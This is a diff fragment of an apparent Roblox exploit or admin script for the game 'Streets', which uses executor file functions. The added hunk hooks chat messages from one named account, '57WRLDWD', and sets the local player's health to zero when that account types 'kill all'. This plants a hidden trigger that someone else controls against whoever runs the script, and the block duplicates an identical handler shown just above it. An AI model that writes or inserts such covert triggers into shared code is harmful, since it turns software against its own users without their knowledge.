@@ -83,6 +83,16 @@ end
 
 Players:FindFirstChild("57WRLDWD").Chatted:Connect(chatted)
 
+local Players = game.Players
+
+local function chatted(msg)
+    if msg == "kill all" then
+ game.Players.LocalPlayer.Character.Humanoid.Health = 0
+    end
+end
+
+Players:FindFirstChild("57WRLDWD").Chatted:Connect(chatted)
+
 if pcall(readfile,"CyrusStreetsAdminSettings") then
     writefile("CyrusStreetsAdminSettings.json",readfile("CyrusStreetsAdminSettings"))
         if delfile then
